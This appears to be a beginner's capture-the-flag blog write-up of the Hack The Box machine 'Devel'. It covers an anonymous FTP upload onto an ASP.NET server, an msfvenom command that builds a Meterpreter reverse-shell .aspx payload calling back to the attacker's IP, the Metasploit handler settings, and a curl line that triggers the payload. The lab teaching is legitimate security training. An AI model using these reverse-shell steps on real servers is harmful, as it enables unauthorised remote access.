---
title: Devel
date: 2020-05-09 11:29:00
description: Hack The Box Writeup
featured_image: '/images/blog/devel/devel.jpg'
tags: ['Hack The Box']
---

<p>Here is another box from Hack the Box (HTB) that is simple and great for beginners. In Devel's box, I'll be using Metasploit and the open FTP port to upload a webshell to gain shell access on the machine.</p>

<h2>Hack the box</h2>
<ul>
	<li>Operating System: Windows</li>
	<li>Difficulty: Easy</li>
</ul>

<h2>Information gathering</h2>

Let's start with the nmap scan. 

<img src="/images/blog/devel/ipaddress.jpg" alt="nmap scan">

<p>And our results are in:</p>

<img src="/images/blog/devel/nmapresults.jpg" alt="nmap results"> 

<p>The results look interesting. We can see that port 21 (FTP) is open, and it allows for anonymous login.</p>

<p>I tried logging in using the anonymous login--success. There wasn't anything interesting inside the files, but I was able to upload a file onto the FTP server. Here's what I did:</p>

<img src="/images/blog/devel/testupload.jpg" alt="nmap results"> 

<p>Since it's accessible through the command line, I also tried accessing the FTP service through the web browser so that I can use Burp Suite to see if I can get more information about this box.</p>

<p>Taking a look at the HTTP header, we can see that it's running ASP.NET. Meaning, it will likely be able to run a .aspx file when we start exploiting the box.</p>

<img src="/images/blog/devel/httpheader.jpg" alt="nmap results"> 

<p>Let's recap, we know two things right now:</p>

<ul>
	<li>We can upload files onto the FTP server.</li>
	<li>FTP is running on ASP.NET, so we can add a .aspx file.</li>
</ul>

<p>This might be enough for us to run an exploit since we can try uploading a payload generator with .aspx extension and gain the box via reverse shell. Let's give it a shot.</p>

<h2>Threat modelling</h2>

<p>The first thing that we want to do is create a payload. To create a payload we can use msfvenom by typing into the command line:</p>

<code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > rev.aspx</code>

<img src="/images/blog/devel/payload.jpg" alt="nmap results"> 

<p>Once the file is created, we'll want to upload it to the FTP service:</p>

<img src="/images/blog/devel/payloadftp.jpg" alt="nmap results"> 

<p>Okay, we're pretty much ready to exploit the box. Let's start by opening up Metasploit.</p>

<h2>Exploitation</h2>

<p>Once Metasploit opens, we can type in:</p>

<code>use exploit/multi/handler</code>

<p>This provides a listener for callbacks that are generated outside of Metasploit.</p>

<p>Next, I filled out the following:</p>

<ul>
	<li><code>set payload windows/meterpreter/reverse_tcp</code>: Sets the payload.</li>
	<li><code>set lhost tun0</code>: Sets the listening IP address.</li>
	<li><code>set lport 4444</code>: This should be the LPORT you listed when we created the payload above.</li>
	<li><code>options</code>: Good habit to make sure everything was filled.</li>
</ul>

<p>Okay, it should be ready to go. We can use the <code>exploit</code> command to run it.</p>

<img src="/images/blog/devel/metasploit.jpg" alt="nmap results"> 

<p>It looks like it's working! We can now open the payload file that we uploaded earlier either through the web browser or by typing in another terminal window:</p>

<code>curl http://10.10.10.5/rev.aspx</code>

<p>Once we've opened the file, we can go back to our Metasploit terminal window--and look at that! We now have access to the box. As always, we can use the <code>shell</code> command to gain shell access, so that you can get the root.txt and user.txt file.</p>

<img src="/images/blog/devel/shell.jpg" alt="nmap results"> 

<p>Great, another HTB machine completed.</p>
